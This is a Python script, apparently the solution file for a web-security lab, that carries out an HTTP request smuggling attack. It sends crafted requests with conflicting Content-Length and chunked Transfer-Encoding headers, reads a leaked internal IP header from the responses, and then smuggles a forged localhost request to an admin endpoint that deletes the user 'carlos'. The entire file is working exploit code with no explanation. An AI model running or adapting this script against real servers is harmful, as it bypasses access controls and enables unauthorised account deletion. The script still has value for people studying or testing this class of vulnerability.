import re
import socket
import ssl
import sys
import urllib.parse

def request_smuggling_attack(host, port, path):
    raw_request = (
        "POST {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 124\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "POST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 200\r\n"
        "Connection: close\r\n"
        "\r\n"
        "search=test"
    ).format(path, host)

    context = ssl.create_default_context()

    responses = []

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            for _ in range(2):
                ssock.sendall(raw_request.encode())
                response = ssock.recv(4096)
                responses.append(response.decode())

    return responses

def extract_special_header(responses):
    header_pattern = re.compile(r'(X-.*-Ip):\s*([\d\.]+)')
    for response in responses:
        print("Debug: Full response received:\n", response)
        match = header_pattern.search(response)
        if match:
            return match.group(1), match.group(2)
    return None, None

def send_new_request(host, port, path, special_header):
    raw_request = (
        "POST {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 166\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin/delete?username=carlos HTTP/1.1\r\n"
        "{}: 127.0.0.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "Connection: close\r\n"
        "\r\n"
        "x=1\r\n"
        "\r\n"
    ).format(path, host, special_header)

    context = ssl.create_default_context()

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_request.encode())
            response = ssock.recv(4096)
            print(response.decode())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    parsed_url = urllib.parse.urlparse(url)

    host = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else 443
    path = parsed_url.path if parsed_url.path else "/"

    responses = request_smuggling_attack(host, port, path)

    special_header, _ = extract_special_header(responses)

    send_new_request(host, port, path, special_header)
    send_new_request(host, port, path, special_header)
